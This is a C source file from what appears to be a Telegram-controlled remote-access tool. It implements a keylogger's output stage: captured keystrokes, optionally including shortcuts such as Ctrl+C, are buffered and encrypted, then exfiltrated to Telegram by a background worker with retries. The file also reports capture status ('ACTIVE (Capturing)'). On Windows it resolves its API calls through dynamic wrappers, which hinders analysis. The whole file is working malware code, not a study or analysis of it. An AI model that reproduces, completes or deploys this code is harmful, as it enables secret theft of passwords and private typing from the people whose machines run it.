/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard_output.h"
#include "../config/config.h"
#include "../crypto/arena.h"
#include "../crypto/crypto.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"
#include "../telegram/telegram_platform.h"
#include "keyboard.h"

#include <stdint.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN32
#include <errno.h>
#include <pthread.h>
#include <time.h>
#if defined(__linux__) && defined(__GLIBC__)
#include <malloc.h>
#endif
#else
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "../win32/win32_api.h"

static void c2t_InitializeCriticalSection(
    LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.InitializeCriticalSection)
    g_c2t_win32.InitializeCriticalSection(lpCriticalSection);
}
static void c2t_EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.EnterCriticalSection)
    g_c2t_win32.EnterCriticalSection(lpCriticalSection);
}
static void c2t_LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.LeaveCriticalSection)
    g_c2t_win32.LeaveCriticalSection(lpCriticalSection);
}
static HANDLE c2t_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
                               SIZE_T dwStackSize,
                               LPTHREAD_START_ROUTINE lpStartAddress,
                               LPVOID lpParameter, DWORD dwCreationFlags,
                               LPDWORD lpThreadId) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateThread)
    return g_c2t_win32.CreateThread(lpThreadAttributes, dwStackSize,
                                    lpStartAddress, lpParameter,
                                    dwCreationFlags, lpThreadId);
  return NULL;
}

static void c2t_DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.DeleteCriticalSection)
    g_c2t_win32.DeleteCriticalSection(lpCriticalSection);
}
static ULONGLONG c2t_GetTickCount64(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetTickCount64)
    return g_c2t_win32.GetTickCount64();
  return 0;
}
static void c2t_Sleep(DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.Sleep)
    g_c2t_win32.Sleep(dwMilliseconds);
}
static DWORD c2t_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.WaitForSingleObject)
    return g_c2t_win32.WaitForSingleObject(hHandle, dwMilliseconds);
  return WAIT_FAILED;
}
static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}
static VOID c2t_InitializeConditionVariable(
    PCONDITION_VARIABLE ConditionVariable) {
  c2t_win32_api_init();
  if (g_c2t_win32.InitializeConditionVariable)
    g_c2t_win32.InitializeConditionVariable(ConditionVariable);
}
static BOOL c2t_SleepConditionVariableCS(
    PCONDITION_VARIABLE ConditionVariable, PCRITICAL_SECTION CriticalSection,
    DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.SleepConditionVariableCS)
    return g_c2t_win32.SleepConditionVariableCS(ConditionVariable,
                                                 CriticalSection, dwMilliseconds);
  return FALSE;
}
static VOID c2t_WakeConditionVariable(PCONDITION_VARIABLE ConditionVariable) {
  c2t_win32_api_init();
  if (g_c2t_win32.WakeConditionVariable)
    g_c2t_win32.WakeConditionVariable(ConditionVariable);
}

#define InitializeCriticalSection c2t_InitializeCriticalSection
#define EnterCriticalSection c2t_EnterCriticalSection
#define LeaveCriticalSection c2t_LeaveCriticalSection
#define DeleteCriticalSection c2t_DeleteCriticalSection
#define CreateThread c2t_CreateThread
#define GetTickCount64 c2t_GetTickCount64
#define Sleep c2t_Sleep
#define WaitForSingleObject c2t_WaitForSingleObject
#define CloseHandle c2t_CloseHandle
#define InitializeConditionVariable c2t_InitializeConditionVariable
#define SleepConditionVariableCS c2t_SleepConditionVariableCS
#define WakeConditionVariable c2t_WakeConditionVariable
#endif

#define KEYBOARD_BUFFER_CAPACITY 1024U
#define KEYBOARD_DEFAULT_FLUSH_MS 3000U

typedef struct keyboard_event {
  struct keyboard_event *next;
  size_t length;
  size_t allocation_size;
  unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
  unsigned char encrypted_data[];
} keyboard_event_t;

static keyboard_event_t *queue_head;
static keyboard_event_t *queue_tail;
static size_t queue_bytes;
static size_t queue_items;
static size_t maximum_queue_bytes;
static size_t maximum_queue_items;
static size_t delivery_attempts;
static size_t retry_delay_ms;
static size_t inactivity_flush_ms;
static int stopping;
static int worker_started;
static atomic_int keyboard_paused;
static uint64_t total_keyboard_bytes;
static uint64_t total_keyboard_keystrokes;

static char text_buffer[KEYBOARD_BUFFER_CAPACITY];
static size_t text_buffer_len;
static uint64_t last_key_time_ms;

#ifdef _WIN32
static CRITICAL_SECTION queue_mutex;
static CONDITION_VARIABLE queue_condition;
static HANDLE worker_thread;

static void queue_lock(void) { EnterCriticalSection(&queue_mutex); }
static void queue_unlock(void) { LeaveCriticalSection(&queue_mutex); }
static void queue_wait_timeout(DWORD ms) {
  (void)SleepConditionVariableCS(&queue_condition, &queue_mutex, ms);
}
static void queue_signal(void) { WakeConditionVariable(&queue_condition); }
#else
static pthread_mutex_t queue_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t queue_condition = PTHREAD_COND_INITIALIZER;
static pthread_t worker_thread;

static void queue_lock(void) { (void)pthread_mutex_lock(&queue_mutex); }
static void queue_unlock(void) { (void)pthread_mutex_unlock(&queue_mutex); }
static void queue_wait_timeout(unsigned int ms) {
  struct timespec now;
  clock_gettime(CLOCK_REALTIME, &now);
  now.tv_sec += (time_t)(ms / 1000);
  now.tv_nsec += (long)(ms % 1000) * 1000000L;
  if (now.tv_nsec >= 1000000000L) {
    now.tv_sec += 1;
    now.tv_nsec -= 1000000000L;
  }
  (void)pthread_cond_timedwait(&queue_condition, &queue_mutex, &now);
}
static void queue_signal(void) { (void)pthread_cond_signal(&queue_condition); }
#endif

static uint64_t get_monotonic_ms(void) {
#ifdef _WIN32
  return GetTickCount64();
#else
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
    return (uint64_t)now.tv_sec * 1000 + (uint64_t)now.tv_nsec / 1000000;
  }
  return 0;
#endif
}

static void retry_delay(size_t attempt) {
  size_t delay =
      retry_delay_ms > 60000 / attempt ? 60000 : retry_delay_ms * attempt;
#ifdef _WIN32
  Sleep((DWORD)delay);
#else
  struct timespec duration = {.tv_sec = (time_t)(delay / 1000),
                              .tv_nsec = (long)(delay % 1000) * 1000000L};
  while (nanosleep(&duration, &duration) != 0 && errno == EINTR) {
  }
#endif
}

static c2t_arena_t keyboard_arena;

static void enqueue_locked(const void *data, size_t length) {
  if (length == 0)
    return;

  size_t allocation_size = sizeof(keyboard_event_t) + length;
  if (maximum_queue_bytes > 0 &&
      (queue_bytes >= maximum_queue_bytes ||
       allocation_size > maximum_queue_bytes - queue_bytes)) {
    c2t_log_warning("keyboard", "Queue byte limit exceeded; discarding event");
    return;
  }
  if (maximum_queue_items > 0 && queue_items >= maximum_queue_items) {
    c2t_log_warning("keyboard", "Queue item limit exceeded; discarding event");
    return;
  }

  keyboard_event_t *event =
      (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
  if (!event) {
    if (queue_items == 0) {
      c2t_arena_reset(&keyboard_arena);
      event =
          (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
    }
  }
  if (!event) {
    event = malloc(allocation_size);
  }
  if (!event) {
    c2t_log_error("keyboard", "Out of memory allocating keyboard event");
    return;
  }

  event->next = nullptr;
  event->length = length;
  event->allocation_size = allocation_size;

  if (!c2t_crypto_get_random_bytes(event->nonce, C2T_CRYPTO_NONCE_SIZE)) {
    c2t_log_error("keyboard", "Failed to generate nonce for keyboard event");
    if (c2t_arena_contains(&keyboard_arena, event)) {
      c2t_secure_zero(event, allocation_size);
    } else {
      c2t_secure_zero(event, allocation_size);
      free(event);
    }
    return;
  }
  if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
    c2t_log_error("keyboard", "Encryption failed for keyboard payload");
    if (c2t_arena_contains(&keyboard_arena, event)) {
      c2t_secure_zero(event, allocation_size);
    } else {
      c2t_secure_zero(event, allocation_size);
      free(event);
    }
    return;
  }

  if (queue_tail) {
    queue_tail->next = event;
  } else {
    queue_head = event;
  }
  queue_tail = event;
  queue_bytes += allocation_size;
  ++queue_items;

  queue_signal();
}

static int is_whitespace_only(const char *buf, size_t len) {
  for (size_t i = 0; i < len; ++i) {
    unsigned char c = (unsigned char)buf[i];
    if (c != ' ' && c != '\t' && c != '\r' && c != '\n' && c != '\0') {
      return 0;
    }
  }
  return 1;
}

static void flush_buffer_locked(void) {
  if (text_buffer_len == 0)
    return;

  if (is_whitespace_only(text_buffer, text_buffer_len)) {
    c2t_secure_zero(text_buffer, sizeof(text_buffer));
    text_buffer_len = 0;
    last_key_time_ms = 0;
    return;
  }

  enqueue_locked(text_buffer, text_buffer_len);
  c2t_secure_zero(text_buffer, sizeof(text_buffer));
  text_buffer_len = 0;
  last_key_time_ms = 0;
}

void keyboard_output_flush(void) {
  queue_lock();
  flush_buffer_locked();
  queue_unlock();
}

void keyboard_output_append(const char *text, size_t length) {
  if (!text || length == 0 || keyboard_is_paused())
    return;

  queue_lock();
  total_keyboard_keystrokes += length;

  size_t consumed = 0;
  while (consumed < length) {
    size_t available = KEYBOARD_BUFFER_CAPACITY - 1U - text_buffer_len;
    if (available == 0) {
      flush_buffer_locked();
      available = KEYBOARD_BUFFER_CAPACITY - 1U;
    }

    size_t remaining = length - consumed;
    size_t chunk = remaining < available ? remaining : available;
    const char *newline = memchr(text + consumed, '\n', chunk);
    if (newline)
      chunk = (size_t)(newline - (text + consumed)) + 1U;

    memcpy(text_buffer + text_buffer_len, text + consumed, chunk);
    text_buffer_len += chunk;
    consumed += chunk;

    if (newline || text_buffer_len == KEYBOARD_BUFFER_CAPACITY - 1U)
      flush_buffer_locked();
  }

  last_key_time_ms = get_monotonic_ms();
  queue_signal();
  queue_unlock();
}

void keyboard_output_backspace(void) {
  if (keyboard_is_paused())
    return;

  queue_lock();
  total_keyboard_keystrokes++;
  if (text_buffer_len > 0) {
    size_t pos = text_buffer_len;
    --pos;
    while (pos > 0 && ((unsigned char)text_buffer[pos] & 0xC0) == 0x80) {
      --pos;
    }
    memset(text_buffer + pos, 0, text_buffer_len - pos);
    text_buffer_len = pos;
    last_key_time_ms = get_monotonic_ms();
  }
  queue_unlock();
}

static atomic_int keyboard_shortcuts_enabled;

int keyboard_get_shortcuts_enabled(void) {
  return atomic_load_explicit(&keyboard_shortcuts_enabled,
                              memory_order_relaxed);
}

void keyboard_set_shortcuts_enabled(int enabled) {
  atomic_store_explicit(&keyboard_shortcuts_enabled, enabled ? 1 : 0,
                        memory_order_relaxed);
}

int keyboard_toggle_shortcuts(void) {
  return atomic_fetch_xor_explicit(&keyboard_shortcuts_enabled, 1,
                                   memory_order_relaxed) ^
         1;
}

static atomic_int keyboard_format_mode = KEYBOARD_MODE_CODE;

static void deliver_event(const keyboard_event_t *event) {
  for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
    if (telegram_send_encrypted_data(event->encrypted_data, event->length,
                                     event->nonce, C2T_KEYBOARD_MIME_TYPE,
                                     nullptr)) {
      queue_lock();
      total_keyboard_bytes += event->length;
      queue_unlock();
      return;
    }
    if (attempt < delivery_attempts) {
      c2t_log_warning("keyboard", "Delivery attempt %llu/%llu failed; retrying",
                      (unsigned long long)attempt,
                      (unsigned long long)delivery_attempts);
      retry_delay(attempt);
    }
  }
  c2t_log_error("keyboard", "Keyboard delivery failed after %llu attempts",
                (unsigned long long)delivery_attempts);
}

#ifdef _WIN32
static DWORD WINAPI delivery_worker([[maybe_unused]] void *context)
#else
static void *delivery_worker([[maybe_unused]] void *context)
#endif
{
  for (;;) {
    queue_lock();

    while (!queue_head && !stopping) {
      if (text_buffer_len > 0) {
        uint64_t now = get_monotonic_ms();
        uint64_t elapsed =
            (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
        if (elapsed >= inactivity_flush_ms) {
          flush_buffer_locked();
          break;
        }
        unsigned int wait_ms = (unsigned int)(inactivity_flush_ms - elapsed);
        queue_wait_timeout(wait_ms > 0 ? wait_ms : 50);
        if (text_buffer_len > 0) {
          now = get_monotonic_ms();
          elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
          if (elapsed >= inactivity_flush_ms) {
            flush_buffer_locked();
            break;
          }
        }
      } else {
        queue_wait_timeout(5000);
      }
    }

    if (!queue_head && stopping) {
      flush_buffer_locked();
      if (!queue_head) {
        queue_unlock();
        break;
      }
    }

    keyboard_event_t *event = queue_head;
    if (event) {
      queue_head = event->next;
      if (!queue_head)
        queue_tail = nullptr;
      queue_unlock();

      deliver_event(event);

      size_t allocation_size = event->allocation_size;
      int arena_owned = c2t_arena_contains(&keyboard_arena, event);
      queue_lock();
      queue_bytes -= allocation_size;
      --queue_items;
      if (arena_owned && queue_items == 0) {
        c2t_arena_reset(&keyboard_arena);
      } else {
        c2t_secure_zero(event, allocation_size);
      }
      queue_unlock();

      if (!arena_owned)
        free(event);
    } else {
      queue_unlock();
    }
  }

  telegram_http_thread_cleanup();
#ifdef _WIN32
  return 0;
#else
  return nullptr;
#endif
}

int keyboard_is_paused(void) {
  return atomic_load_explicit(&keyboard_paused, memory_order_relaxed);
}

void keyboard_set_paused(int paused) {
  atomic_store_explicit(&keyboard_paused, paused ? 1 : 0,
                        memory_order_relaxed);
}

int keyboard_toggle_paused(void) {
  return atomic_fetch_xor_explicit(&keyboard_paused, 1,
                                   memory_order_relaxed) ^
         1;
}

void keyboard_set_format_mode(int mode) {
  atomic_store_explicit(&keyboard_format_mode, mode, memory_order_relaxed);
}

int keyboard_get_format_mode(void) {
  return atomic_load_explicit(&keyboard_format_mode, memory_order_relaxed);
}

void keyboard_get_status_info(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0)
    return;

  char target[128] = "all";
  keyboard_get_selected_target(target, sizeof(target));
  char layout_name[128] = "Auto";
  keyboard_get_layout(layout_name, sizeof(layout_name));
  int dev_count = keyboard_get_device_count();
  int paused = keyboard_is_paused();
  int mode = keyboard_get_format_mode();

  queue_lock();
  size_t cur_items = queue_items;
  size_t cur_bytes = queue_bytes;
  size_t cur_buf = text_buffer_len;
  uint64_t tot_bytes = total_keyboard_bytes;
  uint64_t tot_keys = total_keyboard_keystrokes;
  queue_unlock();

  char tot_str[64] = {};
  if (tot_bytes < 1024) {
    snprintf(tot_str, sizeof(tot_str), "%llu B", (unsigned long long)tot_bytes);
  } else if (tot_bytes < 1024 * 1024) {
    snprintf(tot_str, sizeof(tot_str), "%.1f KB (%llu B)",
             (double)tot_bytes / 1024.0, (unsigned long long)tot_bytes);
  } else {
    snprintf(tot_str, sizeof(tot_str), "%.2f MB (%llu bytes)",
             (double)tot_bytes / (1024.0 * 1024.0),
             (unsigned long long)tot_bytes);
  }

  snprintf(buffer, max_len,
           "⌨️ <b>Keyboard Listener Status</b>\n\n"
           "• <b>Status:</b> %s\n"
           "• <b>Active Layout:</b> %s\n"
           "• <b>Shortcuts &amp; Modifiers:</b> %s\n"
           "• <b>Total Delivered:</b> %s in %llu keystrokes\n"
           "• <b>Format Mode:</b> %s\n"
           "• <b>Selected Target:</b> <code>%s</code>\n"
           "• <b>Detected Devices:</b> %d\n"
           "• <b>Pending Buffer:</b> %llu bytes\n"
           "• <b>Delivery Queue:</b> %llu items / %llu bytes\n"
           "• <b>Inactivity Flush:</b> %llu ms",
           paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
           layout_name,
           keyboard_get_shortcuts_enabled()
               ? "🟢 <b>ENABLED</b> (Capturing [Ctrl+C], [Alt+...], etc.)"
               : "⚪ <b>DISABLED</b> (Clean typing text only)",
           tot_str, (unsigned long long)tot_keys,
           mode == KEYBOARD_MODE_CODE
               ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>"
               : "<code>Raw Plain Text</code>",
           target, dev_count, (unsigned long long)cur_buf,
           (unsigned long long)cur_items, (unsigned long long)cur_bytes,
           (unsigned long long)inactivity_flush_ms);
}

uint64_t keyboard_get_total_bytes(void) {
  queue_lock();
  uint64_t val = total_keyboard_bytes;
  queue_unlock();
  return val;
}

uint64_t keyboard_get_total_keystrokes(void) {
  queue_lock();
  uint64_t val = total_keyboard_keystrokes;
  queue_unlock();
  return val;
}

int keyboard_output_init(void) {
  if (worker_started)
    return 1;
  if (!c2t_crypto_init()) {
    c2t_log_error("keyboard", "Unable to initialize crypto session key");
    return 0;
  }

  maximum_queue_bytes = c2t_config_get()->queue_max_bytes;
  maximum_queue_items = c2t_config_get()->queue_max_items;
  delivery_attempts = c2t_config_get()->delivery_attempts;
  retry_delay_ms = c2t_config_get()->retry_delay_ms;
  inactivity_flush_ms = c2t_config_get()->keyboard_flush_ms > 0
                            ? c2t_config_get()->keyboard_flush_ms
                            : KEYBOARD_DEFAULT_FLUSH_MS;
  keyboard_set_shortcuts_enabled(c2t_config_get()->keyboard_shortcuts);
  stopping = 0;
  keyboard_set_paused(0);
  text_buffer_len = 0;
  last_key_time_ms = 0;

  (void)c2t_arena_init(&keyboard_arena, 64U * 1024U);

#ifdef _WIN32
  InitializeCriticalSection(&queue_mutex);
  InitializeConditionVariable(&queue_condition);
  worker_thread =
      CreateThread(nullptr, 0, delivery_worker, nullptr, 0, nullptr);
  worker_started = worker_thread != nullptr;
#else
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, 512 * 1024);
  worker_started =
      pthread_create(&worker_thread, &attr, delivery_worker, nullptr) == 0;
  pthread_attr_destroy(&attr);
#endif

  if (!worker_started) {
    c2t_log_error("keyboard", "Unable to start keyboard delivery worker");
    c2t_arena_destroy(&keyboard_arena);
#ifdef _WIN32
    DeleteCriticalSection(&queue_mutex);
#endif
  }
  return worker_started;
}

void keyboard_output_cleanup(void) {
  if (!worker_started)
    return;

  queue_lock();
  stopping = 1;
  flush_buffer_locked();
  queue_signal();
  queue_unlock();

#ifdef _WIN32
  WaitForSingleObject(worker_thread, INFINITE);
  CloseHandle(worker_thread);
  DeleteCriticalSection(&queue_mutex);
#else
  (void)pthread_join(worker_thread, nullptr);
#endif

  while (queue_head) {
    keyboard_event_t *event = queue_head;
    queue_head = event->next;
    c2t_secure_zero(event, event->allocation_size);
    if (!c2t_arena_contains(&keyboard_arena, event)) {
      free(event);
    }
  }
  c2t_arena_destroy(&keyboard_arena);
  queue_tail = nullptr;
  queue_bytes = 0;
  queue_items = 0;
  worker_started = 0;
#if defined(__GLIBC__) && !defined(_WIN32)
  malloc_trim(0);
#endif
}
